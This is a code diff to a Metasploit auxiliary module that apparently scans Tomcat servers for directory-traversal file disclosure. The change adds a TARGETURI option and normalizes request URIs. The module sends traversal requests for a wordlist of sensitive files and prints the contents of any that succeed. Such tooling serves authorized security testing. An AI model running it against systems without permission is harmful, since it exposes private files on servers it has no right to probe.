@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
+        OptString.new('TARGETURI', [true, 'URI to the Tomcat instance', '/']),
         OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
         OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
@@ -64,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw(
         {
           'method'  => 'GET',
-          'uri'     => try + files,
+          'uri'     => normalize_uri(datastore['TARGETURI'], try, files),
           }, 25)
       if (res and res.code == 200)
         print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
@@ -84,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw(
         {
           'method'  => 'GET',
-          'uri'     => '/',
+          'uri'     => normalize_uri(datastore['TARGETURI']),
         }, 25)
 
       if (res)
